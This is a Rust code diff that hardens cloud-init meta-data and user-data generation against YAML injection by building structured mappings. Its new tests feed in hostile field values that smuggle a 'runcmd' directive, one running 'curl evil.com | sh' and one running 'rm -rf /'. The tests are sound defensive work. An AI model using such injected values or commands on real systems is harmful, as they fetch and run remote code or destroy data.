@@ -13,6 +13,7 @@ use std::process::Command;
 use std::time::Instant;
 
 use serde::{Deserialize, Serialize};
+use serde_yaml::Value as YamlValue;
 use tracing::{info, warn};
 
 use crate::image::error::ImageError;
@@ -367,10 +368,21 @@ pub fn generate_cloud_init(
     };
 
     // -- 1. Write meta-data --------------------------------------------------
-    let meta_data = format!(
-        "instance-id: {}\nlocal-hostname: {}\n",
-        instance_id, config.hostname
+    let mut meta_map = serde_yaml::Mapping::new();
+    meta_map.insert(
+        YamlValue::String("instance-id".to_string()),
+        YamlValue::String(instance_id.to_string()),
     );
+    meta_map.insert(
+        YamlValue::String("local-hostname".to_string()),
+        YamlValue::String(config.hostname.clone()),
+    );
+    let meta_data = serde_yaml::to_string(&meta_map).map_err(|e| {
+        cleanup(&work_dir, &dest);
+        ImageError::CloudInitGenerationFailed {
+            reason: format!("failed to serialize meta-data: {e}"),
+        }
+    })?;
     let meta_path = work_dir.join("meta-data");
     if let Err(e) = fs::write(&meta_path, &meta_data) {
         cleanup(&work_dir, &dest);
@@ -380,40 +392,59 @@ pub fn generate_cloud_init(
     }
 
     // -- 2. Write user-data --------------------------------------------------
-    let mut user_data = String::from("#cloud-config\n");
+    // Build the cloud-config as a structured YAML mapping to prevent injection.
+    let mut cloud_cfg = serde_yaml::Mapping::new();
 
     // Build users list
-    let mut users_yaml = String::new();
+    let mut users_list: Vec<YamlValue> = Vec::new();
 
     // Default user
-    users_yaml.push_str(&format!("  - name: {}\n", config.default_user));
-    users_yaml.push_str("    sudo: ALL=(ALL) NOPASSWD:ALL\n");
-    users_yaml.push_str("    shell: /bin/bash\n");
+    let mut default_user = serde_yaml::Mapping::new();
+    default_user.insert(
+        "name".into(),
+        YamlValue::String(config.default_user.clone()),
+    );
+    default_user.insert(
+        "sudo".into(),
+        YamlValue::String("ALL=(ALL) NOPASSWD:ALL".to_string()),
+    );
+    default_user.insert("shell".into(), YamlValue::String("/bin/bash".to_string()));
     if !config.ssh_authorized_keys.is_empty() {
-        users_yaml.push_str("    ssh_authorized_keys:\n");
-        for key in &config.ssh_authorized_keys {
-            users_yaml.push_str(&format!("      - {key}\n"));
-        }
+        let keys: Vec<YamlValue> = config
+            .ssh_authorized_keys
+            .iter()
+            .map(|k| YamlValue::String(k.clone()))
+            .collect();
+        default_user.insert("ssh_authorized_keys".into(), YamlValue::Sequence(keys));
     }
+    users_list.push(YamlValue::Mapping(default_user));
 
     // Additional users
     for user in &config.users {
-        users_yaml.push_str(&format!("  - name: {}\n", user.name));
+        let mut u = serde_yaml::Mapping::new();
+        u.insert("name".into(), YamlValue::String(user.name.clone()));
         if !user.groups.is_empty() {
-            users_yaml.push_str(&format!("    groups: {}\n", user.groups.join(", ")));
+            u.insert("groups".into(), YamlValue::String(user.groups.join(", ")));
         }
         if let Some(sudo) = &user.sudo {
-            users_yaml.push_str(&format!("    sudo: {sudo}\n"));
+            u.insert("sudo".into(), YamlValue::String(sudo.clone()));
         }
         if let Some(shell) = &user.shell {
-            users_yaml.push_str(&format!("    shell: {shell}\n"));
+            u.insert("shell".into(), YamlValue::String(shell.clone()));
         }
+        users_list.push(YamlValue::Mapping(u));
     }
 
-    if !users_yaml.is_empty() {
-        user_data.push_str("users:\n");
-        user_data.push_str(&users_yaml);
-    }
+    cloud_cfg.insert("users".into(), YamlValue::Sequence(users_list));
+
+    // Serialize the structured config, then prepend #cloud-config header.
+    let body = serde_yaml::to_string(&cloud_cfg).map_err(|e| {
+        cleanup(&work_dir, &dest);
+        ImageError::CloudInitGenerationFailed {
+            reason: format!("failed to serialize user-data: {e}"),
+        }
+    })?;
+    let mut user_data = format!("#cloud-config\n{body}");
 
     if let Some(extra) = &config.user_data_extra {
         user_data.push_str(extra);
@@ -1014,6 +1045,107 @@ mod tests {
 
         // Temp working directory should have been cleaned up
         assert!(!dir.path().join("cloud-init-tmp").exists());
+    }
+
+    // ========================================================================
+    // 3b. YAML injection prevention (#670)
+    // ========================================================================
+
+    #[test]
+    fn cloud_init_hostname_injection_is_escaped() {
+        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
+            eprintln!("SKIP: mkfs.vfat/mcopy not available");
+            return;
+        }
+
+        let tmp = TempDir::new().unwrap();
+        let id = InstanceId::new();
+        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
+
+        // Malicious hostname attempting YAML injection
+        let config = CloudInitConfig {
+            hostname: "evil\nruncmd:\n  - curl evil.com | sh".to_string(),
+            ssh_authorized_keys: vec![],
+            default_user: "ubuntu".to_string(),
+            users: vec![],
+            network_config: None,
+            user_data_extra: None,
+        };
+
+        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();
+
+        // Extract meta-data and verify the injected payload is quoted/escaped
+        let extract_dir = tmp.path().join("extract");
+        fs::create_dir_all(&extract_dir).unwrap();
+        let out = Command::new("mcopy")
+            .args([
+                "-i",
+                &img_path.to_string_lossy(),
+                "::meta-data",
+                &extract_dir.join("meta-data").to_string_lossy(),
+            ])
+            .output()
+            .unwrap();
+        assert!(out.status.success());
+
+        let content = fs::read_to_string(extract_dir.join("meta-data")).unwrap();
+        // The malicious hostname must NOT appear as a bare `runcmd:` directive.
+        // serde_yaml will quote the multiline string, preventing injection.
+        let parsed: serde_yaml::Mapping = serde_yaml::from_str(&content).unwrap();
+        let hostname_val = parsed
+            .get(YamlValue::String("local-hostname".to_string()))
+            .unwrap();
+        // The value must be a single scalar containing the full injected string,
+        // NOT split into separate YAML keys.
+        assert_eq!(
+            hostname_val.as_str().unwrap(),
+            "evil\nruncmd:\n  - curl evil.com | sh"
+        );
+    }
+
+    #[test]
+    fn cloud_init_username_injection_is_escaped() {
+        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
+            eprintln!("SKIP: mkfs.vfat/mcopy not available");
+            return;
+        }
+
+        let tmp = TempDir::new().unwrap();
+        let id = InstanceId::new();
+        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
+
+        let config = CloudInitConfig {
+            hostname: "safe-host".to_string(),
+            ssh_authorized_keys: vec![],
+            default_user: "admin\nruncmd:\n  - rm -rf /".to_string(),
+            users: vec![],
+            network_config: None,
+            user_data_extra: None,
+        };
+
+        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();
+
+        let extract_dir = tmp.path().join("extract");
+        fs::create_dir_all(&extract_dir).unwrap();
+        let out = Command::new("mcopy")
+            .args([
+                "-i",
+                &img_path.to_string_lossy(),
+                "::user-data",
+                &extract_dir.join("user-data").to_string_lossy(),
+            ])
+            .output()
+            .unwrap();
+        assert!(out.status.success());
+
+        let raw = fs::read_to_string(extract_dir.join("user-data")).unwrap();
+        // Strip the #cloud-config header and parse the YAML body
+        let yaml_body = raw.strip_prefix("#cloud-config\n").unwrap();
+        let parsed: serde_yaml::Value = serde_yaml::from_str(yaml_body).unwrap();
+        let users = parsed["users"].as_sequence().unwrap();
+        let name = users[0]["name"].as_str().unwrap();
+        // Must be a single quoted scalar, not split into YAML keys
+        assert_eq!(name, "admin\nruncmd:\n  - rm -rf /");
     }
 
     // ========================================================================
